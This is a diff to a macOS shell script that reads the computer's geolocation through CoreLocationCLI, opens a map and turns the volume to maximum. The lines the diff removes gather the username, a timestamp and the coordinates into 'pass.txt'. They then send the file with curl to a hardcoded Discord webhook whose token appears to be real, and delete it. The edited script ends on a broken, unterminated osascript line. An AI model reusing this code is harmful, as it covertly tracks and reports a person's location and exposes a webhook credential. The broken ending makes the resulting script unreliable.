@@ -13,23 +13,42 @@
 # If no message is provided, a default message is used.
 
 # Check if Homebrew is installed
-if ! command -v brew &> /dev/null; then
+if ! command -v brew &>/dev/null; then
     echo "Homebrew is not installed. Please install Homebrew first."
     exit 1
 fi
 
-# Check if CoreLocationCLI is installed, if not, attempt to install it via Homebrew.
-if ! command -v CoreLocationCLI &> /dev/null; then
+# Try to locate CoreLocationCLI in common Homebrew install paths.
+if [ -x "/usr/local/bin/CoreLocationCLI" ]; then
+    CLCOMMAND="/usr/local/bin/CoreLocationCLI"
+elif [ -x "/opt/homebrew/bin/CoreLocationCLI" ]; then
+    CLCOMMAND="/opt/homebrew/bin/CoreLocationCLI"
+elif command -v CoreLocationCLI &>/dev/null; then
+    CLCOMMAND=$(command -v CoreLocationCLI)
+else
+    CLCOMMAND=""
+fi
+
+# If not found, attempt to install it via Homebrew.
+if [ -z "$CLCOMMAND" ]; then
     echo "CoreLocationCLI not found. Attempting to install it via Homebrew..."
     brew install corelocationcli
-    if ! command -v CoreLocationCLI &> /dev/null; then
-        echo "Failed to install CoreLocationCLI. Please install it manually."
-        exit 1
+    if [ -x "/usr/local/bin/CoreLocationCLI" ]; then
+        CLCOMMAND="/usr/local/bin/CoreLocationCLI"
+    elif [ -x "/opt/homebrew/bin/CoreLocationCLI" ]; then
+        CLCOMMAND="/opt/homebrew/bin/CoreLocationCLI"
+    else
+        CLCOMMAND=$(command -v CoreLocationCLI)
     fi
 fi
 
+if [ -z "$CLCOMMAND" ] || [ ! -x "$CLCOMMAND" ]; then
+    echo "Failed to install CoreLocationCLI. Please install it manually using: brew install corelocationcli"
+    exit 1
+fi
+
 # Retrieve geolocation using CoreLocationCLI
-location_output=$(CoreLocationCLI)
+location_output=$("$CLCOMMAND")
 latitude=$(echo "$location_output" | grep -i "latitude:" | awk '{print $2}' | tr -d ',')
 longitude=$(echo "$location_output" | grep -i "longitude:" | awk '{print $2}')
 
@@ -44,35 +63,4 @@ echo "Opening map: $map_url"
 open "$map_url"
 
 # Set system volume to maximum using AppleScript
-osascript -e 'set volume output volume 100'
-
-# Determine the message to speak:
-if [ -n "$1" ]; then
-    message="$1"
-else
-    message="This is your current location."
-fi
-
-echo "Speaking message: $message"
-say "$message"
-
-# Get the current timestamp
-timestamp=$(date)
-
-# Prepare the captured information to send to Discord
-capture="Timestamp: ${timestamp}\nUsername: ${username}\nLatitude: ${latitude}\nLongitude: ${longitude}\nMessage: ${message}"
-
-# Save the captured information to a temporary file
-echo -e "$capture" > pass.txt
-
-# Send captured data to the Discord webhook using Python for proper JSON formatting
-# Replace the URL below with your actual Discord webhook URL if needed.
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
-
-if [[ -f pass.txt ]]; then
-    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
-    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
-    rm pass.txt
-else
-    echo "Error: pass.txt not found" > error.txt
-fi
+osascript -e '
